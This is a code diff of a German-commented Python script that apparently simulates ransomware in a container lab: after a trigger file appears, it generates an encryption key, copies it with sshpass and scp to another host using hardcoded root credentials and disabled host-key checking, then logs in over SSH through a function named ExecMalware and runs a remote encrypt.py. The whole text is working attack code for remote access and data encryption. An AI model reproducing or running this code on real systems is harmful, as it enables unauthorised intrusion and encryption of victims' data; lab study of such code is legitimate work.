@@ -1,21 +1,19 @@
 import os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+from cryptography.hazmat.backends import default_backend
 import os
 import time
 import paramiko
 
 def ExecMalware():
-    getCredentials()
-    import paramiko
-    import time
 
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect('172.17.0.2', username=user, password=pw)
+    client.connect('172.17.0.3', username="root", password="root")
 
     time.sleep(1)
-    stdin, stdout, stderr = client.exec_command('python3 decrypt.py')
+    stdin, stdout, stderr = client.exec_command('cd ../ && python3 encrypt.py')
 
 
     for line in stdout:
@@ -38,21 +36,31 @@ def wait_for_file(file_path, timeout=60):
 
     print("Datei gefunden:", file_path)
     # Führen Sie hier Ihre gewünschte Aktion aus
+    print("erzeuge schlüssel")
+    time.sleep(3)
+    print("---------")
+
+
     key = os.urandom(32)  # Erzeuge einen zufälligen 256-Bit-Schlüssel
 
     with open("chkey.txt", "wb") as keyfile:
         keyfile.write(key)
-        
-    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no chkey.txt "+ "root"+"@172.17.0.3:/root"
+    
+    print("schlüssel erzeugt")
+    time.sleep(3)
+    print("sende schlüssel")
+    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no chkey.txt "+ "root"+"@172.17.0.3:/root/../"
     os.system(ostring)
-    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no decrypt.txt "+ "root"+"@172.17.0.3:/root"
-
+    
+    #ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no decrypt.txt "+ "root"+"@172.17.0.3:/root"
+    time.sleep(5)
+    print("Führe verschlüsselung durch")
+    ExecMalware()
 
 
 # Beispielaufruf
 file_path = "/kenndaten.txt"
 wait_for_file(file_path, timeout=120)
-ExecMalware()
 
 
 
